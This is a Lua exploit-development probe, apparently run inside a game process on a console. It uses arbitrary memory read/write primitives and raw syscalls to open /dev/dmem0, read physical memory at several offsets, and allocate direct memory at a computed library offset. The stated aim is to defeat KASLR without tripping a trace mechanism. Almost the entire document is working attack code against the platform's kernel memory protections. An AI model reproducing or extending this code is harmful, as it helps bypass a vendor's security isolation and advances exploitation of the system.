-- CRASH_CLASS: LOW
-- PROBE 562y: Read physical memory via /dev/dmem0 pread
--
-- 562x proved: MapDM trace triggers on VA ACCESS, not spawn.
-- Any userland read from MapDM'd VA = trace + death.
--
-- ALTERNATIVE: /dev/dmem0 is openable from game process.
-- pread(fd, buf, len, offset) reads from fd at offset.
-- If dmem0 allows pread at arbitrary phys offsets → KASLR defeat
-- without ever touching MapDM.
--
-- 562q had a PATH BUG: wrote 0x0030 instead of 0x0000306D at dp+8,
-- making "/dev/dme0" instead of "/dev/dmem0". FIXED HERE.
--
-- Also test AllocateDirectMemory wrapper to get a known phys addr,
-- then pread at that addr to verify the device works.

print("=== PROBE 562y: /dev/dmem0 PREAD ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

-- Module bases
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
print(string.format("lk=0x%X%08X", lhi, llo))
io.flush()

-- ============================================================
-- [A] Open /dev/dmem0 with CORRECT path encoding
-- ============================================================
print("[A] open /dev/dmem0")
local dmem_path = memory.alloc(32)
local dp = N(dmem_path)
-- "/dev/dmem0\0" in little-endian dwords:
-- bytes: 2F 64 65 76 / 2F 64 6D 65 / 6D 30 00 00
wd(dp,     0x7665642F)  -- "/dev"
wd(dp + 4, 0x656D642F)  -- "/dme"
wd(dp + 8, 0x0000306D)  -- "m0\0\0"  FIXED (was 0x0030)

-- Verify path bytes
local b0 = rb(dp) or 0
local b4 = rb(dp + 4) or 0
local b8 = rb(dp + 8) or 0
print(string.format("  path dwords: 0x%08X 0x%08X 0x%08X", b0, b4, b8))

-- open(path, O_RDWR) via fn_addr
local ok_open, fd_raw = pcall(function()
    return native.fcall_with_rax(stub, 5, dmem_path, uint64(2))
end)
local fd = ok_open and N(fd_raw) or -999
print("  fd=" .. fd)
io.flush()

if fd < 0 then
    -- Try O_RDONLY
    ok_open, fd_raw = pcall(function()
        return native.fcall_with_rax(stub, 5, dmem_path, Z)
    end)
    fd = ok_open and N(fd_raw) or -999
    print("  fd(RDONLY)=" .. fd)
    io.flush()
end

if fd < 0 then
    print("OPEN FAILED — trying /dev/dmem1")
    -- Try dmem1
    wd(dp + 8, 0x0000316D)  -- "m1\0\0"
    ok_open, fd_raw = pcall(function()
        return native.fcall_with_rax(stub, 5, dmem_path, uint64(2))
    end)
    fd = ok_open and N(fd_raw) or -999
    print("  dmem1 fd=" .. fd)
    io.flush()
end

if fd < 0 then
    print("ALL DMEM OPENS FAILED")
    -- Try /dev/zero as control
    local zpath = memory.alloc(16)
    wd(N(zpath),     0x7665642F)  -- "/dev"
    wd(N(zpath) + 4, 0x72657A2F)  -- "/zer"
    wd(N(zpath) + 8, 0x0000006F)  -- "o\0\0\0"
    local ok_z, fd_z = pcall(function()
        return native.fcall_with_rax(stub, 5, zpath, Z)
    end)
    print("  /dev/zero fd=" .. (ok_z and N(fd_z) or -999))
    print("=== 562y DONE ===")
    return
end

-- ============================================================
-- [B] pread at various physical offsets
-- ============================================================
print("")
print("[B] pread tests")
local read_buf = memory.alloc(256)

local offsets = {
    {0, 0, "phys 0x0 (reset vector)"},
    {0, 0x1000, "phys 0x1000"},
    {0, 0x100000, "phys 1MB"},
    {0, 0x1000000, "phys 16MB"},
    {0, 0x10000000, "phys 256MB"},
    {1, 0x00000000, "phys 4GB (0x100000000)"},
    {1, 0x10000000, "phys 4GB+256MB"},
}

for _, entry in ipairs(offsets) do
    local off_hi, off_lo, label = entry[1], entry[2], entry[3]
    -- Clear buffer
    for i = 0, 60, 4 do wd(N(read_buf) + i, 0) end

    -- pread(fd, buf, 64, offset) = syscall 475
    -- offset is 64-bit: need uint64
    local offset_val
    if off_hi > 0 then
        offset_val = uint64(string.format("0x%X%08X", off_hi, off_lo))
    else
        offset_val = uint64(off_lo)
    end

    local ok_pr, rv_pr = pcall(function()
        return native.fcall_with_rax(stub, 475,
            uint64(fd), read_buf, uint64(64), offset_val)
    end)
    local rv = ok_pr and N(rv_pr) or -999

    local line = string.format("  %s: rv=%d", label, rv)
    if rv > 0 then
        local v0 = rb(N(read_buf)) or 0
        local v1 = rb(N(read_buf) + 4) or 0
        local v2 = rb(N(read_buf) + 8) or 0
        local v3 = rb(N(read_buf) + 12) or 0
        line = line .. string.format(" [%08X_%08X %08X_%08X]", v1, v0, v3, v2)
        if v0 == 0x464C457F then line = line .. " *** ELF! ***" end
    end
    print(line)
    io.flush()
end

-- ============================================================
-- [C] Try read() instead of pread (lseek + read)
-- ============================================================
print("")
print("[C] lseek + read test at phys 0x100000000")
-- lseek(fd, offset, SEEK_SET=0) = syscall 478
local ok_ls, rv_ls = pcall(function()
    return native.fcall_with_rax(stub, 478,
        uint64(fd), uint64("0x100000000"), Z)
end)
print("  lseek rv=" .. (ok_ls and N(rv_ls) or -999))

if ok_ls then
    for i = 0, 60, 4 do wd(N(read_buf) + i, 0) end
    local ok_rd2, rv_rd2 = pcall(function()
        return native.fcall_with_rax(stub, 3,
            uint64(fd), read_buf, uint64(64))
    end)
    local rv2 = ok_rd2 and N(rv_rd2) or -999
    local line = "  read rv=" .. rv2
    if rv2 > 0 then
        local v0 = rb(N(read_buf)) or 0
        local v1 = rb(N(read_buf) + 4) or 0
        line = line .. string.format(" [%08X_%08X]", v1, v0)
        if v0 == 0x464C457F then line = line .. " *** ELF! ***" end
    end
    print(line)
end
io.flush()

-- ============================================================
-- [D] AllocateDirectMemory to get a known physical address,
--     then pread at that address to verify device behavior
-- ============================================================
print("")
print("[D] AllocateDirectMemory + pread verification")
local alloc_fn = lk + uint64(0x17EF0)
local phys_out = memory.alloc(8)
wq(N(phys_out), Z)

-- AllocateDirectMemory(search_start, search_end, len, align, mem_type, &phys_addr_out)
local ok_alloc, rv_alloc = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        Z, uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), phys_out)
end)
local alloc_rv = ok_alloc and N(rv_alloc) or -999
local phys_lo = rb(N(phys_out)) or 0
local phys_hi = rb(N(phys_out) + 4) or 0
print(string.format("  alloc rv=%d phys=0x%X%08X", alloc_rv, phys_hi, phys_lo))

if alloc_rv == 0 and (phys_lo > 0 or phys_hi > 0) then
    -- pread at the allocated physical address
    local phys_addr = uint64(string.format("0x%X%08X", phys_hi, phys_lo))
    for i = 0, 60, 4 do wd(N(read_buf) + i, 0) end

    local ok_pr2, rv_pr2 = pcall(function()
        return native.fcall_with_rax(stub, 475,
            uint64(fd), read_buf, uint64(64), phys_addr)
    end)
    local rv2 = ok_pr2 and N(rv_pr2) or -999
    print(string.format("  pread(phys) rv=%d", rv2))
    if rv2 > 0 then
        local v0 = rb(N(read_buf)) or 0
        local v1 = rb(N(read_buf) + 4) or 0
        print(string.format("  data: %08X_%08X", v1, v0))
    end
end
io.flush()

-- ============================================================
-- [E] Close + alive
-- ============================================================
pcall(function() native.fcall_with_rax(stub, 6, uint64(fd)) end)
local pid2 = N(native.fcall_with_rax(stub, 20))
print("")
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562y DONE ===")
